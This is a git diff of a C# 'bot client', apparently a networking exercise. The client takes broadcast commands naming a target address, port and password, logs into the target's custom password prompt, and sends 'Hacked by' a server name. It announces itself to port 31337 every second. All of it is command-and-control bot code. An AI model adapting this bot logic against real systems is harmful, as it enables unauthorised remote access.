@@ -12,16 +12,17 @@ namespace BotClients
 		static UdpClient client = new UdpClient(port_);
 		static IPEndPoint ep = new IPEndPoint(IPAddress.Broadcast, port_); // endpoint where server is listening
 
-	
-		public static void  Main(string[] args)
+
+		public static void Main(string[] args)
 		{
-			
 			///int port2 = ((IPEndPoint)client.Client.LocalEndPoint).Port;
 			Console.WriteLine("Bot is listening on port " + port_);
 			Thread listenThread = new Thread(() =>
 			{
 				//try
 				//{
+				while (true)
+				{
 					byte[] receivedData = client.Receive(ref ep);
 					byte[] ip_to_attack = new byte[4];
 					byte[] port_to_attack = new byte[2];
@@ -51,52 +52,66 @@ namespace BotClients
 						name_of_server[j] = receivedData[i];
 						j++;
 					}
-					Console.WriteLine("bot " + receivedData);
-					attack(ip_to_attack, port_to_attack, pass_to_attack, name_of_server);
-				//}
-				//catch (Exception e)
-				//{
-				//	Console.WriteLine("exp " + e.Message);
-				//}
+					Attack(ip_to_attack, port_to_attack, pass_to_attack, name_of_server);
 
+					//}
+					//catch (Exception e)
+					//{
+					//	Console.WriteLine("exp " + e.Message);
+					//}
+				}
 			});
 			listenThread.Start();
-				//Console.Write("receive data from " + ep.ToString());
+			//Console.Write("receive data from " + ep.ToString());
 			while (true)
 			{
-
-			
-				byte[] int_bytes = BitConverter.GetBytes((Int16)ep.Port);
-				//if (BitConverter.IsLittleEndian)
-				//{
-				//	Array.Reverse(int_bytes);
-				//	int_bytes[0] = int_bytes[2];
-				//	int_bytes[1] = int_bytes[3];
-				//}
-				// send data
-				client.Send(int_bytes, int_bytes.Length, new IPEndPoint(IPAddress.Broadcast, 31337) );
-
+				byte[] int_bytes = BitConverter.GetBytes((Int16)port_);
+				client.Send(int_bytes, int_bytes.Length, new IPEndPoint(IPAddress.Broadcast, 31337));
 				Thread.Sleep(1000);
 			}
-		
 		}
-		public static void attack(byte[] ip_to_attack, byte[] port_to_attack, byte[] pass_to_attack, byte[] name_of_server)
-		{
-			
-			Socket s = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
-			IPAddress[] ipnew = Dns.GetHostAddresses(Dns.GetHostName());
-			IPAddress temp = new IPAddress(ip_to_attack);
-			IPEndPoint ipEnd = new IPEndPoint(new IPAddress(ip_to_attack), BitConverter.ToUInt16(port_to_attack, 0));
-			//IPEndPoint ipEnd = new IPEndPoint(ipnew[1], BitConverter.ToUInt16(port_to_attack, 0));
 
-			s.Connect(ipEnd);
+		public static void Attack(byte[] ip_to_attack, byte[] port_to_attack, byte[] pass_to_attack, byte[] name_of_server)
+		{
+
+			while (true)
+			{
+				TcpClient s = new TcpClient(new IPAddress(ip_to_attack).ToString(), BitConverter.ToUInt16(port_to_attack, 0));
+				IPAddress[] ipnew = Dns.GetHostAddresses(Dns.GetHostName());
+				//IPEndPoint ipEnd = new IPEndPoint(ipnew[1], BitConverter.ToUInt16(port_to_attack, 0));
+				NetworkStream ns = s.GetStream(); //networkstream is used to send/receive messages
+				byte[] buffer = new byte[256];
+				try {
+					ns.Read(buffer, 0, buffer.Length);
+					string message = Encoding.Default.GetString(buffer);
+					Console.Write("got from victim: " + message);
+					if (message.Contains("Please enter password"))
+					{
+						byte[] toSend = Encoding.Default.GetBytes(Encoding.Default.GetString(pass_to_attack) + "\r\n");
+						ns.Write(toSend, 0, toSend.Length);
+						Console.Write("sent from victim: " + Encoding.Default.GetString(pass_to_attack) + "\r\n");
+					}
+					ns.Read(buffer, 0, buffer.Length);
+					string message1 = Encoding.Default.GetString(buffer);
+					Console.Write("got from victim: " + message1);
+					if (message1.Contains("Access granted"))
+					{
+						byte[] toSend = Encoding.Default.GetBytes("Hacked by " + Encoding.Default.GetString(name_of_server) + "\r\n");
+						ns.Write(toSend, 0, toSend.Length);
+						Console.Write("sent from victim: " + "Hacked by " + Encoding.Default.GetString(name_of_server) + "\r\n");
+					}
+				}
+				catch (Exception)
+				{
+					Console.WriteLine("problem with victim con");
+				}
 			
-			s.Send(System.Text.Encoding.ASCII.GetBytes("hack"));
-		
-			
-			Console.ReadLine();
-			s.Close();
+				s.Close();
+				ns.Close();
+				break;
+			}
 		}
+
 		static int FreeTcpPort()
 		{
 			TcpListener l = new TcpListener(IPAddress.Loopback, 0);
@@ -105,6 +120,5 @@ namespace BotClients
 			l.Stop();
 			return port;
 		}
-
 	}
 }
